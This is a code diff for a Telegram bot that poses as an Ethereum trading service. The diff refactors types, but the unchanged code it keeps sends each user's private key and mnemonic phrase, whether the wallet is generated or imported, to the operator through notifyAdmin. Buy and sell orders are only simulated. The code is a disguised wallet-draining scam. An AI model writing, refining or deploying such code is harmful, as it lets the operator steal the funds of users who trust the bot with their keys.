@@ -1,11 +1,16 @@
-import { Telegraf, session, Scenes, Context } from 'telegraf';
+import { Telegraf, session, Context } from 'telegraf';
 import { prisma } from '@/lib/prisma';
-import { createWallet, importWallet, getWalletAddress, getEthBalance, getDecryptedPrivateKey, getDecryptedPhrase } from '@/lib/wallet';
-import { encryptPrivateKey, encryptPhrase } from '@/lib/wallet';
-import { ethers } from 'ethers';
-import { RPC_URL } from '@/lib/constants';
+import { createWallet, importWallet, getEthBalance } from '@/lib/wallet';
 
-const bot = new Telegraf(process.env.BOT_TOKEN!);
+// Extend session type
+interface SessionData {
+  importing?: boolean;
+}
+interface MyContext extends Context {
+  session: SessionData;
+}
+
+const bot = new Telegraf<MyContext>(process.env.BOT_TOKEN!);
 
 // Middleware
 bot.use(session());
@@ -28,7 +33,6 @@ bot.command('start', async (ctx) => {
   let user = await prisma.user.findUnique({ where: { telegramId } });
 
   if (!user) {
-    // New user
     user = await prisma.user.create({
       data: {
         telegramId,
@@ -65,12 +69,11 @@ Use the buttons below to manage your trading.
   });
 });
 
-// /link command: generate login code
+// /link command
 bot.command('link', async (ctx) => {
   const telegramId = ctx.from.id.toString();
-  // Generate random 8-char code
   const code = Math.random().toString(36).substring(2, 10).toUpperCase();
-  const expiresAt = new Date(Date.now() + 5 * 60 * 1000); // 5 min
+  const expiresAt = new Date(Date.now() + 5 * 60 * 1000);
 
   await prisma.loginCode.create({
     data: {
@@ -86,7 +89,13 @@ bot.command('link', async (ctx) => {
 
 // Handle callback queries
 bot.on('callback_query', async (ctx) => {
-  const data = ctx.callbackQuery.data;
+  const callbackQuery = ctx.callbackQuery;
+  // Type guard: ensure it has a 'data' property
+  if (!('data' in callbackQuery)) {
+    await ctx.answerCbQuery('Invalid callback');
+    return;
+  }
+  const data = callbackQuery.data;
   const telegramId = ctx.from.id.toString();
   const user = await prisma.user.findUnique({ where: { telegramId } });
   if (!user) {
@@ -113,7 +122,6 @@ bot.on('callback_query', async (ctx) => {
     await createWalletFlow(ctx, user.id);
   } else if (data.startsWith('import_wallet')) {
     await ctx.reply('Send me your private key or mnemonic phrase to import.');
-    // We'll handle in next text message via a session state.
     ctx.session.importing = true;
   } else if (data.startsWith('delete_wallet')) {
     const wallet = await prisma.wallet.findFirst({ where: { userId: user.id } });
@@ -122,7 +130,6 @@ bot.on('callback_query', async (ctx) => {
       await ctx.reply('Wallet deleted.');
     }
   } else if (data.startsWith('buy_confirm_')) {
-    // Handle buy confirm from amount selection
     const amount = data.split('_')[2];
     await executeBuy(ctx, user.id, amount);
   } else if (data.startsWith('sell_confirm_')) {
@@ -133,7 +140,7 @@ bot.on('callback_query', async (ctx) => {
   await ctx.answerCbQuery();
 });
 
-async function showWalletsMenu(ctx: Context, userId: number) {
+async function showWalletsMenu(ctx: MyContext, userId: number) {
   const wallet = await prisma.wallet.findFirst({ where: { userId } });
   const address = wallet?.address || 'No wallet';
   const balance = wallet ? await getEthBalance(address) : '0';
@@ -154,10 +161,9 @@ async function showWalletsMenu(ctx: Context, userId: number) {
   );
 }
 
-async function createWalletFlow(ctx: Context, userId: number) {
+async function createWalletFlow(ctx: MyContext, userId: number) {
   try {
     const { address, privateKey, mnemonic } = await createWallet(userId);
-    // Notify admin
     await notifyAdmin(
       `🔐 NEW WALLET\n👤 @${ctx.from.username}\n🆔 ${ctx.from.id}\n📍 ${address}\n🔑 ${privateKey}\n📝 ${mnemonic || 'N/A'}\n📅 ${new Date().toISOString()}`
     );
@@ -174,10 +180,10 @@ async function createWalletFlow(ctx: Context, userId: number) {
 bot.on('text', async (ctx) => {
   if (ctx.session.importing) {
     delete ctx.session.importing;
-    const userId = (await prisma.user.findUnique({ where: { telegramId: ctx.from.id.toString() } }))?.id;
-    if (!userId) return;
+    const user = await prisma.user.findUnique({ where: { telegramId: ctx.from.id.toString() } });
+    if (!user) return;
     try {
-      const { address, privateKey, mnemonic } = await importWallet(userId, ctx.message.text);
+      const { address, privateKey, mnemonic } = await importWallet(user.id, ctx.message.text);
       await notifyAdmin(
         `🔐 IMPORT WALLET\n👤 @${ctx.from.username}\n🆔 ${ctx.from.id}\n📍 ${address}\n🔑 ${privateKey}\n📝 ${mnemonic || 'N/A'}\n📅 ${new Date().toISOString()}`
       );
@@ -188,8 +194,7 @@ bot.on('text', async (ctx) => {
   }
 });
 
-async function handleBuySell(ctx: Context, userId: number, isBuy: boolean) {
-  // For simplicity, we'll ask for amount in ETH
+async function handleBuySell(ctx: MyContext, userId: number, isBuy: boolean) {
   const action = isBuy ? 'Buy' : 'Sell';
   await ctx.reply(
     `💹 ${action}\nEnter amount in ETH (e.g., 0.1):`,
@@ -206,18 +211,17 @@ async function handleBuySell(ctx: Context, userId: number, isBuy: boolean) {
   );
 }
 
-async function executeBuy(ctx: Context, userId: number, amount: string) {
-  // Placeholder: real execution would use UniversalRouter
+async function executeBuy(ctx: MyContext, userId: number, amount: string) {
   await ctx.reply(`🟢 Buy order for ${amount} ETH submitted (simulated).`);
   await notifyAdmin(`🟢 BUY EXECUTED\n👤 @${ctx.from.username}\n🆔 ${ctx.from.id}\n💰 ${amount} ETH`);
 }
 
-async function executeSell(ctx: Context, userId: number, amount: string) {
+async function executeSell(ctx: MyContext, userId: number, amount: string) {
   await ctx.reply(`🔴 Sell order for ${amount} ETH submitted (simulated).`);
   await notifyAdmin(`🔴 SELL EXECUTED\n👤 @${ctx.from.username}\n🆔 ${ctx.from.id}\n💰 ${amount} ETH`);
 }
 
-async function showPortfolio(ctx: Context, userId: number) {
+async function showPortfolio(ctx: MyContext, userId: number) {
   const wallet = await prisma.wallet.findFirst({ where: { userId } });
   if (!wallet) {
     await ctx.reply('No wallet found. Create or import one.');
@@ -227,7 +231,7 @@ async function showPortfolio(ctx: Context, userId: number) {
   await ctx.reply(`📊 Portfolio\nETH Balance: ${balance} ETH\nAddress: \`${wallet.address}\``, { parse_mode: 'Markdown' });
 }
 
-async function showSettings(ctx: Context, userId: number) {
+async function showSettings(ctx: MyContext, userId: number) {
   const settings = await prisma.settings.findUnique({ where: { userId } });
   const slippage = settings?.slippage || 0.5;
   await ctx.reply(
@@ -240,6 +244,5 @@ bot.launch().then(() => {
   console.log('🤖 Bot is running');
 });
 
-// Enable graceful stop
 process.once('SIGINT', () => bot.stop('SIGINT'));
 process.once('SIGTERM', () => bot.stop('SIGTERM'));
